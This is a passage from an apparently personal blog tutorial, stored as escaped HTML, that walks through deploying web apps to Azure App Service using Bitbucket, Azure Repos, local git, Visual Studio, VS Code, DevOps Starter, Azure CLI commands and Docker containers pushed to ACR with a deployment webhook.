&lt;img src=&quot;/assets/images/img-appservice/captura32.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;In this case I have created another app service for this time.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura33.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;To deploy our web app in the app service we go to “deployment center” and in “source” we choose “bitbucket” (we can use the app service that we have created before and disconnect it and instead of github put bitbucket). we put the organization that we have created in bitbucket, in my case I have created one called “testazure9”, we select the repository and the branch, and we click on save.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura34.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And as we can see that the deploy has been done correctly.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura35.png&quot; /&gt;
&lt;/p&gt;

&lt;h3 id=&quot;deploying-with-azure-repo&quot;&gt;Deploying with Azure repo:&lt;/h3&gt;

&lt;p&gt;To deploy our web app in azure repos is the same process we did in bitbucket and github.&lt;/p&gt;

&lt;p&gt;The first thing we will do is go to the azure repo page and click on “start” to configure azure repo or just go to the azure portal and search for “azure devops”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura36.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Now we are going to name our project, choose whether we want it to be private or public and select the region. And click on “continue”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura37.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And now put the project name and clic in “create project”&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura38.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And as we can see we have already created a workspace and an organization. Now let’s create a repository.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura39.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;To create the repository we click on the arrow indicated in the previous image and click on “new repository”, here we select git and put a name for the repository.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura40.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Inside the repository I have added an index.html file with the following content:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura41.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And click on “commit” to commit the changes we have made.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura42.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;In my case I will create another app service to deploy (as I said before, we can go to the app service we have created and in “deployment centre” we disconnect the previous repo and in “source” we can select “Azure repo”).&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura43.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;To deploy we go to “deployment center” -&amp;gt; “settings” in source we select “Azure repo” and in the “organization” select the organization that you have, and select the project we just created and the repo where we have our web app. And click on “save”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura44.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And we can see that the deploy has been done correctly and the changes have been applied correctly.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura45.png&quot; /&gt;
&lt;/p&gt;

&lt;h3 id=&quot;deploying-with-git-local&quot;&gt;Deploying with git local:&lt;/h3&gt;

&lt;p&gt;I have created another app service for this demonstration (but as I said before we can go to “deployment center” and disconnect and in “source” change the implementation).&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura46.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Once we have selected “git local” we click on “save”. because this time it won’t ask for the repository and branch. Copy the link to clone the repository.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura47.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;When cloning the repository we will be asked for the username and password, the same will happen if we want to push the repo.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura49.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;To find the username and password, in the same “deployment center” in the section where it says “Local GIT or FTP credentials”, copy the username and password and paste it to clone the repo.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura48.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Obviously when cloning the repo it tells us that there is no file as we have just created the app service and deployed it.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura50.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;In my case I have added an html file in the cloned folder with the following content.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura51.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;we push the repository with the link that appears in the “deployment centre”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura52.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;as we can see that the deploy has been successful and the changes have been applied, when we have done the push.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura53.png&quot; /&gt;
&lt;/p&gt;

&lt;h3 id=&quot;deploying-with-vs-code-2019&quot;&gt;Deploying with vs code 2019:&lt;/h3&gt;

&lt;p&gt;In this case the IDE I am using is the community version, but this applied to the pro version.&lt;/p&gt;

&lt;p&gt;We open the vs elbow 2019 and we will create a project.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura54.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Now we are going to choose one of the extensions we want, in this case as we are going to deploy a web app we are going to choose the following extension shown on the screen.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura55.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We will name the project and choose a framework for .NET.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura56.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We choose what type of template we are going to make for our web application and then we click on “create”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura57.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;For this demo I am going to modify the default index.html file in vs code 2019.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura58.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Now we are going to deploy our project in the app service we have created. To do this we are going to right click on the “explorer” of our project and click on “publish”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura59.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We will see a popup of which way we want to publish our project. In this case we will select “azure”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura60.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And in this case we will choose the app service option and click “next”. But we can see that we have other options to deploy.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura61.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Now if we want to create a new app service in vs code 2019 we click on the following icon that is displayed on the screen, and fill in the following options. and click on “create” (Being the first time we may be asked to log in with our azure account).&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura62.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Once the app service has been created, we select the app service we have just created and click on “finish”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura63.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Once we have clicked on “finish”, we will see a summary of the app service we have just created. Finally we click on “publish” to finish the deploy process.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura64.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And as we can see our web app has been published correctly with the changes I have added.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura65.png&quot; /&gt;
&lt;/p&gt;

&lt;h3 id=&quot;push-our-repo-in-github-in-vs-code-2019&quot;&gt;Push our repo in github in vs code 2019:&lt;/h3&gt;

&lt;p&gt;let’s create a remote repo and upload it to our github account, right click on the project explorer and select the option “create a git repo”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura118.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We select github and we will have to log in with our github account to upload the project. And we click on “create and submit changes” to upload our project in github.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura119.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;to verify that the project has been push, wright click on the project explorer and in git select the option “view history (we can view the logs history)”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura120.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And as we can see the repository is uploaded in my github account.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura121.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And to commit the changes, simply select the “git” option, and it will be appear the commit option.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura122.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And to compare the old version of the code with the new version, we simply click on the warning that will appear when committing.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura123.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And to push the changes in github simply in the same option we select “submit changes” and an alert will appear below that the changes are being push in our github repo.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura124.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And as we can see the changes have been push (in my case I added three “s” in the h1).&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura125.png&quot; /&gt;
&lt;/p&gt;

&lt;h3 id=&quot;deploying-with-vs-code&quot;&gt;Deploying with vs code:&lt;/h3&gt;

&lt;p&gt;Now we are going to learn how to create an app service and deploy our web app in vs code.&lt;/p&gt;

&lt;p&gt;First we will go to the extensions section for vs code, and search for app service and install it.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura66.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;For the first time we will be asked to log in with our azure account, to create the app service we simply click on “+”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura67.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;It will ask us to name the app service and then we will choose a language for the runtime stack.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura68.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;It will ask us to choose a plan for our app service. (if we already have a plan created we select it or we can create another plan).&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura69.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;After selecting the plan, you will be notified that the app service has been created successfully.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura70.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Now once we have created the app service, we are going to deploy our web app.&lt;/p&gt;

&lt;p&gt;For this demo i have created a html file with the he following content shown in the image. To deploy, right click on the app service and select the option “deploy” and select the folder where we have all the code of our app.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura71.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We will get a warning if we are sure to deploy. Click on “deploy” to finish the process.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura72.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;If the deploy has been done correctly, we will see a warning that the deploy is being done. click on “browser website” to open the browser.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura73.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And as we can see the deploy has been done correctly and the changes have been applied.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura74.png&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;create-appservice-with-azure-start-devops&quot;&gt;Create appservice with azure start devops&lt;/h2&gt;

&lt;p&gt;Devops started creates a web app in azure devops. DevOps Starter configures everything we need to develop, deploy and monitor our application.&lt;/p&gt;

&lt;p&gt;The first thing we are going to do is from the azure portal look for “Devops starter”, and here we are going to choose a framework or language that we are going to use for our web app.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura76.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Then you must choose two options, the first one is to create an app service running on windows, and the second one if we want our web app to be inside a container. in my case I will choose the first option, because the second option we will see it in a different way later. Click on “next” to continue&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura77.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;In this option we will be asked to give permissions with our github account. And this will create a workflow in our repo.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura78.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Now we will select the organisation, the repository and the branch. We will choose a region and the service plan we want to apply.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura79.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Once we have clicked on “create”, we wait for the process to finish and click on “authorize” so that it can deploy.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura80.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;To do a test, I am going to go to the repository where the workflow has been created, and go to the “armtemplete” folder to modify a bit the default template.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura81.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;In this case I have modified the default index.html file a bit, and we commit to save the changes.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura82.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;we go back to devops starter, we will see that we will see that we have modified the repo and the commit we have just done, we also have the “yml” file which is where we have all the configuration we have done of devops starter.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura83.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And as we can see the changes have been applied correctly. The good thing about this is that it applies the changes quickly and we don’t have to restart any kind of service.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura84.png&quot; /&gt;
&lt;/p&gt;

&lt;h2 id=&quot;azure-cli-commands&quot;&gt;Azure CLI commands&lt;/h2&gt;

&lt;p&gt;All the steps we have done, we can also be done from the azure cli command line in a much faster way. in this case we are going to use some of the azure cli commands.&lt;/p&gt;

&lt;p&gt;There are two ways to use the azure cli command line, the first is from the azure portal by opening the cloud shell, and the second option if you are on windows is to download the azure cli .exe to be able to use the commands in the cmd.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura85.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;All azure CLI commands start with “az”.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;if we use the azure cli from your computer, we have to use the following command to log in with our azure account. with this command we will jump to the browser to log in.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;az login
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we want to login in our azure account in the terminal. (I don’t recommend this option because it is insecure.)&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;az login -u username -p pass
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;command to list all the resource groups we have created.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;az group list
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;see all available regions.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;az account list-locations
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Create a resource group.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;az group create --name yourresourcegroupname --location westeurope
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Delete resource groups.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;az group delete --name resourcegroupname
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Create an app service plan.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;az appservice plan create -g resourgroupname -n namaoftheplan
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;List all the plans we have created in our azure account.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;az appservice plan list
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Create an app service.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;az webapp create --resource-group yourresourgroupname --plan theplanname --name nameoftheappservice --runtime &quot;PHP|7.4&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;As we can see, the app service has been created correctly.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura86.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;logout our azure account in the terminal.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;az logout
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;create-an-app-service-inside-a-container&quot;&gt;Create an app service inside a container&lt;/h2&gt;

&lt;p&gt;What we are going to do is first create a dockerfile in our web app folder and with that create a container from our local machine, then we are going to use the acr service to deploy the container and create an app service from the container we have created.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura87.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;The first thing we are going to do is inside the azure portal we are going to create a registry of our containers (ACR). To do this we go to the search menu and in containers we click on “container registry”, or you can search for “acr” in the search bar from the azure portal.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura88.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Now we will select the resource group, put the name of your acr, and we will choose the region and finally in SKU we are going to select a plan. And click on “review and create”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura89.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;As we can see we have successfully created our ACR.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura90.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;For this demo, I will use a simple node project.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura91.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;In the project folder I have created an simple dockerfile with the following instructions. in “FORM” I have indicated which image I am going to use for my container in this case I have indicated “node”, in “WORK DIR” the path where my web app will be running, and with the command “COPY” and “RUN” I am indicating that I copy all the code of my web app, and with the “run” I indicate to install the dependencies and with this I will always update the container, and finally the parameter “CMD” I indicate that when my container runs I execute the command “nmp start”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura92.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;So in my package.json file yo can see the startup script simply just runs node app.js.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura93.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;So in my app.js file i simply idicate the following message.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura94.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And in the app.js file i indicate to run “app.listen” to specify a port thats exported in that configuration to listening on the port 3000 by defualt.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura95.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We are going to create a docker image of our web app. for this we are going to use the command:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker built -t acrname.azurecr.io/your-webapp-name:lastest .
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In the last paremeter we are going to use “lastest” so that in our container is always the last version of our web app.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura96.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Once the image build process is finished, we are going to use “docker images” command to check if the image has been created correctly.&lt;/p&gt;

&lt;p&gt;And then with the command:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run -d -p 8080:3000 IMAGE ID
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To run the container from local to see if our app is working correctly. The “-p” parameter specifies the port I want my web app to run.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura97.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And as we can see our web app is working correctly inside the container.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura98.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Now we are going to publish the container image we have just created in ACR. To do this we will use the command:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker login yourACRname.azurecr.io
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now let’s log into our ACR to deploy our container image, it will ask us for the user and password. To do this we are going to go to  your ACR =&amp;gt; Access key. Copy and paste the username and password into the terminal.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura99.jpg&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Now we are going to deploy our container image in ACR. for this we are going to use the command:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker push name-of-the-image:lastest
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura100.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And once we have finished the deploy process we are going to check it. for this we will go to: ACR =&amp;gt; repository. And as we can see that the image has been published correctly.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura101.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;If we click on the image we can see what the latest version is and the date when we made the push.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura102.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Now we are going to connect our container that we have uploaded and we are going to connect it with the app service, for this we will go to: Create a resource =&amp;gt; containers =&amp;gt; Web App for containers.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura103.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;Now select the resource group, name our app service, under “publish” it is important that we select the option &lt;strong&gt;&lt;em&gt;“docker container”&lt;/em&gt;&lt;/strong&gt;, choose the OS and the region. And click on “Next”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura104.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;In the docker section it is important that where it says &lt;strong&gt;&lt;em&gt;“Image source”&lt;/em&gt;&lt;/strong&gt; we select the &lt;strong&gt;&lt;em&gt;ACR&lt;/em&gt;&lt;/strong&gt;, and in registry we are going to select the name of our ACR, and in where says “image” select the &lt;strong&gt;&lt;em&gt;docker image&lt;/em&gt;&lt;/strong&gt; that we have deploy, and in label we are going to put &lt;strong&gt;&lt;em&gt;“lastest”&lt;/em&gt;&lt;/strong&gt; to indicate that we want the latest version of the image. And click on “review and create”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura105.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;A notification will appear if it has been successfully created and we click on “go to resource”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura106.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And as we can see that we have created our app service. now we have our app service inside a container.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura107.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;And we can see that my web app is working correctly.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura108.png&quot; /&gt;
&lt;/p&gt;

&lt;h3 id=&quot;create-an-webhook&quot;&gt;Create an webhook:&lt;/h3&gt;

&lt;p&gt;Go to your app service =&amp;gt; click where it says “Deployment center” =&amp;gt; in settings you select the first option “container registry” (here your docker image that you have created will automatically appear) =&amp;gt; select the option “On” in “Continuous deployment”.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura109.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;What this will do is it’ll create a webhook rosource that will fire whenever we push a new version to the docker container image in the ACR and it will actomatically kick off deployment.&lt;/p&gt;

&lt;p&gt;So go to the group of resources where we have created the app service, we can observe that the webhook has been created.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura110.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;We click in the webhook, and we can see it’s never run yet but if we push a new version of the image to the registry it should fire, it should cause a deployment to take place and update our web app.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
&lt;img src=&quot;/assets/images/img-appservice/captura111.png&quot; /&gt;
&lt;/p&gt;

&lt;p&gt;For this demo, I am going to make a modification of my web app.&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
